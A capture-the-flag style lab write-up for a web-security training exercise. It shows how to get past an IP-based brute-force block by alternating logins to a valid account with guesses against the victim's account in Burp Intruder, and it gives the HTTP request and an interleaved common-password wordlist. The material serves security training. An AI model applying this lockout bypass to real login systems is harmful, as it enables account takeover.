## Broken brute-force protection, IP block

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

Your credentials: wiener:peter

Victim's username: carlos
Candidate passwords

Hint :

Advanced users may want to solve this lab by using a macro or the Turbo Intruder extension. However, it is possible to solve the lab without using these advanced features.

## Notes

- Possibility to leave a comment on a post
- /login

## Resume

1. Capture login request
2. Send it to Intruder using a **pitchfork attack**
3. Create a custom username wordlist alternating between `wiener` and `carlos`
4. Create a custom password wordlist alternating between `peter` and candidate passwords
5. Add attack to a **resource pool** with **Maximum concurrent requests = 1**
6. Run attack and filter for `302` response
7. Login with Carlos's credentials


## Solve

Login normally using `wiener:peter`, then logout and try random credentials multiple times. After 3 failed attempts, the application temporarily blocks your IP address.

Send the login request to Intruder:

```http
POST /login HTTP/2
Host: 0ad9000c04f5a1db814f9f34002b004f.web-security-academy.net
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

username=wiener&password=peter
```

Set the attack type to Pitchfork.

Add payload positions on both:

- username
- password

Open the Resource pool tab and create a pool with:

Maximum concurrent requests = 1

This ensures requests are sent sequentially and prevents desynchronization between usernames and passwords.

For payload position 1 (usernames), alternate between your valid account and Carlos:

Each successful login using wiener:peter resets the failed login counter, allowing infinite brute-force attempts against Carlos without triggering the IP block.

Start the attack.

Once finished, filter out all 200 responses and look for a single 302 response associated with the username carlos.

The corresponding payload in Payload 2 is Carlos's password.

Login using Carlos's credentials and access /my-account to solve the lab.

### Username payloads

```txt
wiener
carlos
wiener
carlos
wiener
carlos
```

### Password payloads

```txt
peter
123456
peter
password
peter
12345678
peter
qwerty
peter
123456789
peter
12345
peter
1234
peter
111111
peter
1234567
peter
dragon
peter
123123
peter
baseball
peter
abc123
peter
football
peter
monkey
peter
letmein
peter
shadow
peter
master
peter
666666
peter
qwertyuiop
peter
123321
peter
mustang
peter
1234567890
peter
michael
peter
654321
peter
superman
peter
1qaz2wsx
peter
7777777
peter
121212
peter
000000
peter
qazwsx
peter
123qwe
peter
killer
peter
trustno1
peter
jordan
peter
jennifer
peter
zxcvbnm
peter
asdfgh
peter
hunter
peter
buster
peter
soccer
peter
harley
peter
batman
peter
andrew
peter
tigger
peter
sunshine
peter
iloveyou
peter
2000
peter
charlie
peter
robert
peter
thomas
peter
hockey
peter
ranger
peter
daniel
peter
starwars
peter
klaster
peter
112233
peter
george
peter
computer
peter
michelle
peter
jessica
peter
pepper
peter
1111
peter
zxcvbn
peter
555555
peter
11111111
peter
131313
peter
freedom
peter
777777
peter
pass
peter
maggie
peter
159753
peter
aaaaaa
peter
ginger
peter
princess
peter
joshua
peter
cheese
peter
amanda
peter
summer
peter
love
peter
ashley
peter
nicole
peter
chelsea
peter
biteme
peter
matthew
peter
access
peter
yankees
peter
987654321
peter
dallas
peter
austin
peter
thunder
peter
taylor
peter
matrix
peter
mobilemail
peter
mom
peter
monitor
peter
monitoring
peter
montana
peter
moon
peter
moscow
```